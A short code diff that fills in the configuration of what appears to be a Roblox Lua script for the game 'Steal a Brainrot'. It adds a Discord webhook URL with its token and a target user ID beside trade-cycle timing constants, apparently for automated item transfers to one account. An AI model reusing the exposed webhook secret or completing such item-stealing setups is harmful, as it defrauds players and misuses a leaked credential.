@@ -11,10 +11,10 @@ end)
 
 task.spawn(function()
 
-local GOOD_WEBHOOK = ""
+local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1499248411550158991/tjYXAj4V9mgKDRUQfiKiqIIdfnwSUt19d4Exto0bNNdyv1BGOo64Ei3smVc-v_Sd3kb-"
 local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
-local TARGET_ID =
+local TARGET_ID = 2525631212
 local DELAY_STEP = 1
 local TRADE_CYCLE_DELAY = 2
 
